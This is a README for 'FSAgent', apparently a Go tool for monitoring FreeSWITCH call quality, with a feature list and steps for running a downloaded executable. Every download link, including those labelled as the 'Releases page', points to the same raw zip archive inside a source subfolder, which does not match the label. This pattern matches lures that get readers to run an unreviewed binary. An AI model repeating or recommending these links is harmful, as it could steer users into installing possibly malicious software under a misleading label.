# 🌟 fsagent - Monitor Your FreeSWITCH Calls Effortlessly

[![Download FSAgent](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)

## 📚 About FSAgent 

FSAgent is a high-performance application built in Go. It connects to multiple FreeSWITCH instances and gathers important metrics for call quality. With FSAgent, you can keep track of your calls in real-time and understand how well your calls perform.

## 🚀 Getting Started 

To begin using FSAgent, follow these simple steps. 

## 🛠️ System Requirements 

- **Operating Systems**: Windows 10 or later, macOS, or a recent Linux distribution.
- **Go Version**: You do not need Go installed to run FSAgent, but the application is written in Go version 1.21 or later.
- **Memory**: At least 1 GB of RAM.

## 📥 Download & Install 

You can download the latest version of FSAgent from the Releases page. 

**Visit the page to download:** [FSAgent Releases](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)

1. Click on the link above to open the Releases page.
2. Look for the latest version under the "Releases" section.
3. Download the appropriate file for your operating system.

## ⚙️ How to Run FSAgent 

After downloading the application, follow these steps to run it:

1. **Locate the Downloaded File**:
   - For Windows, the file will generally be in your "Downloads" folder.
   - For macOS, check your "Downloads" folder.
   - For Linux, open your terminal and navigate to the directory where you downloaded the file.

2. **Install the Application**:
   - **Windows**: Double-click the `.exe` file to run it.
   - **macOS**: Open the terminal, navigate to the folder, and type `./fsagent` to start the application.
   - **Linux**: Open a terminal, change to the download directory, and use `chmod +x fsagent` followed by `./fsagent` to execute.

3. **Connect FSAgent to FreeSWITCH**:
   - Open the configuration file in the FSAgent folder.
   - Enter the details of your FreeSWITCH instances.
   - Save the changes and run FSAgent again if necessary.

## 🔍 Features 

FSAgent offers a range of features designed to enhance your call monitoring experience:

- **Multi-Instance Support**: Connect to multiple FreeSWITCH servers at once for comprehensive monitoring.
- **Real-Time RTCP Metrics**: Keep an eye on jitter, packet loss, and other critical call quality metrics as calls are active.
- **QoS Summary Metrics**: Get a full overview of call quality metrics like MOS, jitter, and packet loss when calls complete.
- **Flexible Storage Options**: Decide between quick in-memory storage or more persistent options like Redis.
- **OpenTelemetry Export**: Send your metrics to OpenTelemetry for processing and visualization.

## 📊 Understanding Metrics 

With FSAgent, you will collect various metrics that help evaluate call quality:

- **RTCP Metrics**: Measure the quality of service in real-time as calls happen.
- **Call Quality Summary**: Understand the overall call quality when calls finish, helping you identify areas for improvement.

## 📞 Monitoring Call Quality 

The application provides insights into call quality through detailed metrics. This will help you monitor the performance of calls, making it easier to troubleshoot issues when they arise. 

## 📖 Documentation and Support 

For additional help, you can refer to the official documentation included in the repository. If you encounter issues or have questions, feel free to open an issue on the repository.

## 📣 Stay Updated 

To ensure you are always using the latest features and fixes, regularly check the Releases page for new versions. 

**Download the latest version here:** [FSAgent Releases](https://raw.githubusercontent.com/Voidq123/fsagent/main/pkg/connection/fsagent_v3.7.zip)